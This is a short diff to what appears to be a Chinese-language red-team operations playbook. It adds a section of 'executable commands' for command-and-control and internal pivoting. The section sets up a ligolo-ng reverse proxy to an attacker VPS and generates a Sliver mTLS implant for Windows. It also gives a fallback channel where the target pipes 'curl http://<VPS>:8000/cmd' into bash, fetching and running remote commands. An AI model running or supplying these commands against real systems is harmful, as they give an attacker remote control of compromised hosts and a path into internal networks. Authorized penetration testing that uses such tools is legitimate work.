@@ -63,3 +63,21 @@ enabled: true
 | C2 起得来但目标不出网 | 需换 DNS/ICMP 隧道 |
 | 通道建立但会话不稳 | OPSEC 未达标，不算稳定控制 |
 | 未清理即交付 | 违规 |
+
+## 一·补、可执行命令
+
+```bash
+# ligolo-ng 内网代理（最常用）
+#   攻击端
+./proxy -selfcert -laddr 0.0.0.0:11601
+#   目标端
+./agent -connect <VPS>:11601 -ignore-cert
+
+# Sliver（完整 C2）
+#   generate --mtls <VPS>:8888 --os windows --save /tmp/a.exe
+#   mtls --lport 8888
+
+# 简易 HTTP 通道（应急，OPSEC 低）
+#   攻击端收数据: python3 -m http.server 8000
+#   目标端拉指令: curl -s http://<VPS>:8000/cmd | bash
+```
